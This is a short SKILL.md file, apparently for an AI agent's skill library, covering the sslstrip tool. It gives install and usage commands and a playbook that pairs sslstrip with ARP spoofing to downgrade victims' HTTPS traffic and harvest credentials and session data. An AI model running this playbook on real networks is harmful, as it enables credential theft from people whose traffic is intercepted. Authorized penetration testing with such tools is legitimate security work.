---
name: sslstrip-downgrade
description: "sslstrip downgrades HTTPS to HTTP. Signals: MITM, mitm, logging, POST only"
zh-signals: "sslstrip: HTTPS 降级 HTTP。信号:中间人,mitm,日志,仅 post。"
when-to-use: >-
  Use during an authorized man-in-the-middle engagement to downgrade victims'
  HTTPS traffic to plaintext HTTP and capture credentials and session data.
---

# sslstrip

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/moxie0/sslstrip
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
apt install sslstrip
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `sslstrip -l 8080` | HTTPS downgrade |
| `-w log.txt` | Log |
| `-p` | POST only |

## Attack Scenario Playbook

### HTTPS downgraded to HTTP

```bash
sslstrip -l 8080
# Pair with ARP spoofing to harvest plaintext
```

## Notes

The classic HTTPS downgrade attack tool.
